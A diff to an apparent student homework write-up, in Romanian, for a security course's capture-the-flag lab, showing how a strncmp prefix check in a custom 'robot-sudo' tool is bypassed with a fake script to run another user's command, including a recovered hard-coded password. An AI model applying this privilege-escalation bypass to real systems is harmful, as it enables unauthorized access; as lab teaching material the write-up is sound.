@@ -15,7 +15,44 @@ Tema 1 TSSC
         - decodează mesajul din base64
         - decriptează codul obținut folosind cheia determinată anterior
 
+
 2. linux access control (remote container)
+    Pașii urmați:
+        - Analizarea perechii de chei pentru a afla modul de conectare =>
+            ssh janitor@isc2023.1337.cx -i ./id_rsa
+        - Accesarea directorului în care se găsesc script-urile menționate =>
+            cd /usr/local/bin
+        - Analizarea scripturilor și a executabilului robot-sudo =>
+            ltrace ./robot-sudo /usr/local/bin/vacuum-control
+            Astfel am aflat care este modul de funcționare al robot-sudo:
+                - verifică existența unei linii de forma "allow <user> <cmd>" în
+                  /var/lib/misc/here/robosudo.conf
+                - verificarea se face cu strncmp
+        - Analizarea /var/lib/misc/here/robosudo.conf:
+            allow gicu /usr/lib/ziggy/damn/th3CEO
+            allow janitor /usr/local/bin/vacuum-control
+        - Crearea unui fișier nou care să respecte path-ul din fișierul de con-
+          figurare, astfel încât să treacă verificarea cu strncmp =>
+            touch /usr/local/bin/vacuum-control_fake
+            chmod +x /usr/local/bin/vacuum-control_fake
+        - Analizarea script-ului asupra căruia am văzut că are acces gicu
+          (/usr/lib/ziggy/damn/th3CEO)
+            ltrace /usr/lib/ziggy/damn/th3CEO:
+                puts("Access denied!\n")
+            ltrace /usr/lib/ziggy/damn/th3CEO ceva:
+                strcmp("ceva", "bd2f8e0e7fde4e76a983f1f618432ac9"...)
+                puts("Access denied!\n")
+            ltrace /usr/lib/ziggy/damn/th3CEO bd2f8e0e7fde4e76a983f1f618432ac9:
+                [...]
+                getuid()
+                puts("I will contact you when I requir"...I will contact you
+                    when I require your cleaning services, janitor!)
+          Comanda trebuie așadar să fie dată de alt user, nu de janitor.
+        - Adăugarea comenzii în /usr/local/bin/vacuum-control_fake
+            #!/bin/bash
+            /usr/lib/ziggy/damn/th3CEO bd2f8e0e7fde4e76a983f1f618432ac9
+        - Rularea script-ului =>
+            ./robot-sudo /usr/local/bin/vacuum-control_fake
 
 
 3. binary exploit
